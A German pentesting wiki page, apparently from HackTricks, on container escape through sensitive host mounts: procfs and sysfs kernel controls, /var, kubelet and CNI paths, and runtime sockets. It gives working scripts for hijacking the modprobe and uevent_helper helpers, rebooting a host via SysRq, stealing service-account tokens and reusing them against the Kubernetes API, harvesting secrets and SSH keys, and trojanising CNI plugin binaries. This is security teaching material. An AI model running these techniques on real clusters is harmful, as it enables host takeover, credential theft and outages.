# Sensible Host-Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Überblick

Host-Mounts gehören zu den wichtigsten praktischen Container-Escape-Angriffsflächen, da sie die sorgfältig isolierte Prozessansicht häufig wieder auf eine direkte Sichtbarkeit von Host-Ressourcen zurücksetzen. Die gefährlichen Fälle beschränken sich nicht auf `/`. Bind-Mounts von `/proc`, `/sys`, `/var`, Runtime-Sockets, von kubelet verwalteten Zuständen oder gerätebezogenen Pfaden können Kernel-Steuerungen, Zugangsdaten, die Dateisysteme benachbarter Container und Runtime-Managementschnittstellen offenlegen.

Diese Seite existiert getrennt von den einzelnen Schutzseiten, da das Abuse-Modell mehrere Bereiche umfasst. Ein beschreibbarer Host-Mount ist teilweise wegen Mount-Namespaces, teilweise wegen User-Namespaces, teilweise wegen der Abdeckung durch AppArmor oder SELinux und teilweise wegen des konkret offengelegten Host-Pfads gefährlich. Die Behandlung als eigenes Thema erleichtert die Analyse der Angriffsfläche erheblich.

## `/proc`-Exposition

procfs enthält sowohl gewöhnliche Prozessinformationen als auch Kernel-Steuerungsschnittstellen mit weitreichenden Auswirkungen. Ein Bind-Mount wie `-v /proc:/host/proc` oder eine Containeransicht, die unerwartete beschreibbare proc-Einträge offenlegt, kann daher zur Offenlegung von Informationen, zu Denial of Service oder zur direkten Codeausführung auf dem Host führen.

Zu den besonders wertvollen procfs-Pfaden gehören:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Missbrauch

Beginne damit zu prüfen, welche besonders wertvollen procfs-Einträge sichtbar oder beschreibbar sind:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Diese Pfade sind aus unterschiedlichen Gründen interessant. `core_pattern`, `modprobe` und `binfmt_misc` können bei bestehender Schreibbarkeit zu Host-Code-Execution-Pfaden werden. `kallsyms`, `kmsg`, `kcore` und `config.gz` sind leistungsfähige Reconnaissance-Quellen für Kernel-Exploitation. `sched_debug` und `mountinfo` offenbaren Prozess-, cgroup- und Filesystem-Kontext, der dabei helfen kann, das Host-Layout aus dem Container heraus zu rekonstruieren.

Der praktische Nutzen jedes Pfads ist unterschiedlich. Wenn alle so behandelt werden, als hätten sie dieselben Auswirkungen, wird die Triage erschwert:

- `/proc/sys/kernel/core_pattern`
Wenn dieser Pfad beschreibbar ist, gehört er zu den Pfaden mit den größten Auswirkungen in procfs, da der Kernel nach einem Crash einen Pipe-Handler ausführt. Ein Container, der `core_pattern` auf ein in seinem Overlay oder in einem gemounteten Host-Pfad gespeichertes Payload setzen kann, kann häufig Host-Code-Execution erreichen. Siehe auch [read-only-paths.md](protections/read-only-paths.md) für ein dediziertes Beispiel.
- `/proc/sys/kernel/modprobe`
Dieser Pfad steuert den userspace helper, den der Kernel verwendet, wenn er die Logik zum Laden von Modulen aufrufen muss. Wenn er aus dem Container heraus beschreibbar ist und im Host-Kontext interpretiert wird, kann er zu einem weiteren Host-Code-Execution-Primitiv werden. Besonders interessant ist er in Kombination mit einer Möglichkeit, den Helper-Pfad auszulösen.
- `/proc/sys/vm/panic_on_oom`
Dies ist normalerweise kein sauberer Escape-Primitive, kann aber Memory Pressure in einen hostweiten denial-of-service umwandeln, indem OOM-Bedingungen in ein Kernel-Panic-Verhalten umgewandelt werden.
- `/proc/sys/fs/binfmt_misc`
Wenn die Registration-Schnittstelle beschreibbar ist, kann der Angreifer einen Handler für einen ausgewählten Magic Value registrieren und Host-Kontext-Execution erreichen, sobald eine passende Datei ausgeführt wird.
- `/proc/config.gz`
Nützlich für die Kernel-Exploit-Triage. Damit lässt sich feststellen, welche Subsysteme, Mitigations und optionalen Kernel-Features aktiviert sind, ohne Host-Package-Metadaten zu benötigen.
- `/proc/sysrq-trigger`
Überwiegend ein denial-of-service-Pfad, aber ein sehr schwerwiegender. Er kann den Host sofort rebooten, in einen Panic-Zustand versetzen oder anderweitig stören.
- `/proc/kmsg`
Offenbart Meldungen aus dem Kernel-Ringbuffer. Nützlich für Host-Fingerprinting, Crash-Analyse und in manchen Umgebungen zum Leaken von Informationen, die für Kernel-Exploitation hilfreich sind.
- `/proc/kallsyms`
Wertvoll, wenn lesbar, da dieser Pfad Informationen über exportierte Kernel-Symbole offenlegt und dabei helfen kann, Annahmen zur Address Randomization während der Entwicklung von Kernel-Exploits zu umgehen.
- `/proc/[pid]/mem`
Dies ist eine direkte Schnittstelle zum Prozessspeicher. Wenn der Zielprozess mit den erforderlichen ptrace-artigen Bedingungen erreichbar ist, kann das Lesen oder Ändern des Speichers eines anderen Prozesses möglich sein. Die tatsächlichen Auswirkungen hängen stark von Credentials, `hidepid`, Yama und ptrace-Restriktionen ab. Daher ist dies ein leistungsfähiger, aber bedingter Pfad.
- `/proc/kcore`
Offenbart eine Ansicht des Systemspeichers im Stil eines Core-Images. Die Datei ist riesig und umständlich zu verwenden. Wenn sie jedoch sinnvoll lesbar ist, deutet dies auf eine gravierend exponierte Host-Memory-Oberfläche hin.
- `/proc/kmem` und `/proc/mem`
Historisch gesehen waren dies Raw-Memory-Schnittstellen mit großen Auswirkungen. Auf vielen modernen Systemen sind sie deaktiviert oder stark eingeschränkt. Wenn sie jedoch vorhanden und nutzbar sind, sollten sie als kritische Findings behandelt werden.
- `/proc/sched_debug`
Leakt Scheduling- und Task-Informationen, durch die Host-Prozessidentitäten offengelegt werden können, selbst wenn andere Prozessansichten sauberer als erwartet aussehen.
- `/proc/[pid]/mountinfo`
Äußerst nützlich, um zu rekonstruieren, wo sich der Container tatsächlich auf dem Host befindet, welche Pfade Overlay-backed sind und ob ein beschreibbarer Mount Host-Inhalte oder nur die Container-Layer repräsentiert.

Wenn `/proc/[pid]/mountinfo` oder Overlay-Details lesbar sind, verwende sie, um den Host-Pfad des Container-Filesystems zu ermitteln:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Diese Befehle sind nützlich, da mehrere host-execution tricks erfordern, einen Pfad innerhalb des Containers in den entsprechenden Pfad aus Sicht des Hosts umzuwandeln.

### Vollständiges Beispiel: Missbrauch des `modprobe`-Helper-Pfads

Wenn `/proc/sys/kernel/modprobe` aus dem Container heraus beschreibbar ist und der Helper-Pfad im Host-Kontext interpretiert wird, kann er auf ein vom Angreifer kontrolliertes payload umgeleitet werden:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Der genaue Trigger hängt vom Ziel und dem Kernel-Verhalten ab, aber entscheidend ist, dass ein beschreibbarer Helper-Pfad einen zukünftigen Kernel-Helper-Aufruf auf von Angreifern kontrollierte Inhalte im Host-Pfad umleiten kann.

### Vollständiges Beispiel: Kernel-Recon mit `kallsyms`, `kmsg` und `config.gz`

Wenn das Ziel ein Exploitability-Assessment und nicht ein sofortiger escape ist:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Diese Befehle helfen bei der Beantwortung der Frage, ob nützliche Symbolinformationen sichtbar sind, ob aktuelle Kernel-Meldungen interessante Zustände offenlegen und welche Kernel-Funktionen oder Mitigations einkompiliert sind. Die Auswirkung ist normalerweise kein direkter Escape, aber sie kann die Triage von Kernel-Schwachstellen erheblich verkürzen.

### Vollständiges Beispiel: SysRq-Host-Neustart

Wenn `/proc/sysrq-trigger` beschreibbar ist und die Host-Sicht erreicht:
```bash
echo b > /proc/sysrq-trigger
```
Der Effekt ist ein sofortiger Neustart des Hosts. Dies ist kein subtiler Beispiel, verdeutlicht aber klar, dass die Offenlegung von procfs weitaus schwerwiegender sein kann als reine Informationspreisgabe.

## Offenlegung von `/sys`

sysfs legt große Mengen an Kernel- und Gerätezuständen offen. Einige sysfs-Pfade sind hauptsächlich für das Fingerprinting nützlich, während andere die Ausführung von Hilfsprogrammen, das Geräteverhalten, die Konfiguration von Security-Modulen oder den Firmware-Zustand beeinflussen können.

Zu den besonders wertvollen sysfs-Pfaden gehören:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Diese Pfade sind aus unterschiedlichen Gründen relevant. `/sys/class/thermal` kann das Verhalten des Thermal-Managements und damit die Stabilität des Hosts in Umgebungen mit zu weitreichender Offenlegung beeinflussen. `/sys/kernel/vmcoreinfo` kann Informationen zu Crash-Dumps und zum Kernel-Layout leaken, die beim Low-Level-Fingerprinting des Hosts helfen. `/sys/kernel/security` ist die `securityfs`-Schnittstelle, die von Linux Security Modules verwendet wird. Ein unerwarteter Zugriff darauf kann daher MAC-bezogene Zustände offenlegen oder verändern. EFI-Variablenpfade können Firmware-gestützte Boot-Einstellungen beeinflussen, wodurch sie deutlich schwerwiegender sind als gewöhnliche Konfigurationsdateien. `debugfs` unter `/sys/kernel/debug` ist besonders gefährlich, da es absichtlich eine entwicklerorientierte Schnittstelle mit deutlich weniger Sicherheitsvorkehrungen als gehärtete, produktionsorientierte Kernel-APIs bereitstellt.

Nützliche Befehle zur Überprüfung dieser Pfade sind:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Was diese Befehle interessant macht:

- `/sys/kernel/security` kann offenlegen, ob AppArmor, SELinux oder eine andere LSM-Oberfläche auf eine Weise sichtbar ist, die nur auf dem Host hätte verfügbar sein dürfen.
- `/sys/kernel/debug` ist oft der alarmierendste Fund in dieser Gruppe. Wenn `debugfs` gemountet und lesbar oder beschreibbar ist, sollte man von einer umfangreichen kernelbezogenen Angriffsfläche ausgehen, deren genaues Risiko von den aktivierten Debug-Nodes abhängt.
- Die Offenlegung von EFI-Variablen ist weniger häufig, hat aber erhebliche Auswirkungen, da sie firmwaregestützte Einstellungen und nicht nur gewöhnliche Laufzeitdateien betrifft.
- `/sys/class/thermal` ist hauptsächlich für die Host-Stabilität und die Interaktion mit der Hardware relevant, nicht für einen sauberen Escape wie bei einer Shell.
- `/sys/kernel/vmcoreinfo` ist hauptsächlich eine Quelle für Host-Fingerprinting und Crash-Analyse und nützlich, um den Kernelzustand auf niedriger Ebene zu verstehen.

### Vollständiges Beispiel: `uevent_helper`

Wenn `/sys/kernel/uevent_helper` beschreibbar ist, kann der Kernel möglicherweise einen vom Angreifer kontrollierten Helper ausführen, sobald ein `uevent` ausgelöst wird:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Der Grund, warum dies funktioniert, ist, dass der Pfad des Helpers aus der Perspektive des Hosts interpretiert wird. Sobald er ausgelöst wird, läuft der Helper im Host-Kontext und nicht innerhalb des aktuellen Containers.

## `/var`-Exposition

Das Einbinden des `/var`-Verzeichnisses des Hosts in einen Container wird oft unterschätzt, da es nicht so dramatisch aussieht wie das Einbinden von `/`. In der Praxis kann dies jedoch ausreichen, um auf Runtime-Sockets, Snapshot-Verzeichnisse von Containern, von Kubelet verwaltete Pod-Volumes, projizierte Service-Account-Tokens und die Dateisysteme benachbarter Anwendungen zuzugreifen. Auf modernen Nodes befindet sich dort häufig tatsächlich der operativ interessanteste Container-Zustand.

### Kubernetes-Beispiel

Ein Pod mit `hostPath: /var` kann häufig die projizierten Tokens anderer Pods und den Inhalt von Overlay-Snapshots lesen:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Diese Befehle sind nützlich, weil sie klären, ob der Mount nur belanglose Anwendungsdaten oder hochkritische Cluster-Credentials offenlegt. Ein lesbarer Service-Account-Token kann lokale Codeausführung unmittelbar in Kubernetes-API-Zugriff umwandeln.

Falls der Token vorhanden ist, validiere, worauf er zugreifen kann, statt bei der Token-Erkennung aufzuhören:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Die Auswirkungen können hier weit über den lokalen Node-Zugriff hinausgehen. Ein Token mit weitreichendem RBAC kann ein gemountetes `/var` in eine clusterweite Kompromittierung verwandeln.

### Docker- und containerd-Beispiel

Auf Docker-Hosts befinden sich die relevanten Daten häufig unter `/var/lib/docker`, während sie auf containerd-basierten Kubernetes-Nodes unter `/var/lib/containerd` oder snapshotter-spezifischen Pfaden liegen können:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Wenn das eingehängte `/var` beschreibbare Snapshot-Inhalte eines anderen Workloads offenlegt, kann der Angreifer möglicherweise Anwendungsdateien ändern, Webinhalte platzieren oder Startskripte verändern, ohne die Konfiguration des aktuellen Containers anzufassen.

Konkrete Missbrauchsideen, sobald beschreibbare Snapshot-Inhalte gefunden wurden:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Diese Befehle sind nützlich, weil sie die drei wichtigsten Auswirkungsbereiche eines gemounteten `/var` zeigen: application tampering, die Wiederherstellung von Secrets und lateral movement in benachbarte Workloads.

## Kubelet State, Plugins And CNI Paths

Ein Mount von `/var/lib/kubelet`, `/opt/cni/bin` oder `/etc/cni/net.d` wird häufig durch privilegierte DaemonSets, CNI agents, CSI node plugins, GPU operators und storage helpers offengelegt. Diese Mounts werden leicht als "node plumbing" abgetan, befinden sich jedoch direkt im Ausführungspfad für neue Pods und enthalten häufig Kubelet-Credentials, projected Secrets, Registrierungssockets und ausführbare hostseitige Plugin-Binaries.

Zu den wichtigsten Zielen gehören:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Nützliche Befehle zur Überprüfung sind:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Warum diese Pfade wichtig sind:

- `/var/lib/kubelet/pki` kann kubelet client certificates und andere node-local credentials offenlegen, die je nach Cluster-Design manchmal erneut gegen den API server oder kubelet-facing TLS endpoints verwendet werden können.
- `/var/lib/kubelet/pods` enthält häufig projected service-account tokens und gemountete Secrets für benachbarte Pods auf demselben Node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` ist hauptsächlich eine reconnaissance surface, aber eine sehr nützliche: Sie zeigt, welche Pods und Container derzeit GPUs, hugepages, SR-IOV devices und andere knappe node-local resources verwenden.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` und `/var/lib/kubelet/plugins_registry` zeigen, welche CSI-, DRA- und device plugins installiert sind und mit welchen Sockets der kubelet kommunizieren soll. Wenn diese Verzeichnisse beschreibbar und nicht nur lesbar sind, wird der Befund wesentlich kritischer.
- `/opt/cni/bin` und `/etc/cni/net.d` liegen direkt auf dem Pfad zur Einrichtung des Pod-Netzwerks. Schreibzugriff ist dort häufig ein verzögertes host-execution primitive und nicht nur eine Offenlegung der Konfiguration.

### Vollständiges Beispiel: Beschreibbares `/opt/cni/bin`

Wenn ein Host-CNI-Binary-Verzeichnis read-write gemountet ist, kann das Ersetzen eines Plugins ausreichen, um beim nächsten Erstellen einer Pod-Sandbox durch den kubelet auf diesem Node host execution zu erhalten:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Dies ist nicht so unmittelbar wie ein gemounteter `docker.sock`, aber in kompromittierten Kubernetes-Infrastruktur-Pods oft realistischer. Wichtig ist, dass die manipulierte Binärdatei später vom Netzwerk-Einrichtungsablauf des Hosts ausgeführt wird, nicht vom aktuellen Container.


## Laufzeit-Sockets

Sensible Host-Mounts enthalten häufig Laufzeit-Sockets statt vollständiger Verzeichnisse. Sie sind so wichtig, dass sie hier ausdrücklich erneut erwähnt werden:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Siehe [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) für vollständige Exploit-Abläufe, sobald einer dieser Sockets eingebunden ist.

Als schnelles Muster für die erste Interaktion:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Wenn eine dieser Methoden erfolgreich ist, ist der Weg von einem „mounted socket“ zum „start a more privileged sibling container“ normalerweise deutlich kürzer als jeder Kernel-Breakout-Pfad.

## Writable Host Path Task Hijack

Ein writable host mount muss nicht `/` freigeben, um gefährlich zu sein. Wenn der gemountete Pfad Scripts, Konfigurationsdateien, Hooks, Plugins oder Dateien enthält, die später von einem hostseitigen scheduled task oder Service verwendet werden, kann der Container möglicherweise ändern, was der Host ausführt.

Generic review flow:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Wenn eine beschreibbare Datei von einem Host-Prozess verarbeitet wird, sollte das Payload beim Testen einfach und beobachtbar bleiben:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
Der interessante Teil ist die Vertrauensgrenze: Der Schreibvorgang erfolgt innerhalb des Containers, die Ausführung findet jedoch später im Kontext des Host-Dienstes statt. Dadurch wird ein enger hostPath- oder bind mount zu einem verzögerten Primitive für die Ausführung von Code auf dem Host.

## Mount-bezogene CVEs

Host-Mounts stehen auch im Zusammenhang mit Schwachstellen in der Runtime. Zu den wichtigen aktuellen Beispielen gehören:

- `CVE-2024-21626` in `runc`, bei der ein geleakter Verzeichnis-Dateideskriptor das Arbeitsverzeichnis im Dateisystem des Hosts platzieren konnte.
- `CVE-2024-23651`, `CVE-2024-23652` und `CVE-2024-23653` in BuildKit, bei denen bösartige Dockerfiles, Frontends und `RUN --mount`-Abläufe während Builds den Zugriff auf Host-Dateien, deren Löschung oder erhöhte Privilegien wieder ermöglichen konnten.
- `CVE-2024-1753` in Buildah- und Podman-Build-Abläufen, bei denen präparierte bind mounts während des Builds `/` mit Lese- und Schreibzugriff offenlegen konnten.
- `CVE-2025-47290` in `containerd` 2.1.0, bei der ein TOCTOU während des Entpackens eines Images es einem speziell präparierten Image ermöglichen konnte, das Dateisystem des Hosts während des Pulls zu verändern.

Diese CVEs sind hier relevant, weil sie zeigen, dass der Umgang mit Mounts nicht nur eine Frage der Operator-Konfiguration ist. Auch die Runtime selbst kann Mount-basierte Escape-Bedingungen verursachen.

## Prüfungen

Verwende diese Befehle, um schnell die Mount-Exposures mit dem höchsten Wert zu lokalisieren:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Was hier interessant ist:

- Host-Root, `/proc`, `/sys`, `/var` und Runtime-Sockets sind allesamt Findings mit hoher Priorität.
- Schreibbare proc-/sys-Einträge bedeuten häufig, dass der Mount hostweite Kernel-Steuerungen statt einer sicheren Container-Ansicht offenlegt.
- Gemountete `/var`-Pfade erfordern eine Prüfung auf Credentials und benachbarte Workloads, nicht nur eine Dateisystemprüfung.
- Kubelet-State-Verzeichnisse und CNI-/Plugin-Pfade verdienen dieselbe Priorität wie Runtime-Sockets, da sie häufig direkt im Pfad zur Pod-Erstellung und Credential-Verteilung auf dem Node liegen.

## Referenzen

- [Vom Kubelet verwendete lokale Dateien und Pfade](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent-Container kann über einen `hostPath`-Mount auf den Host zugreifen](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
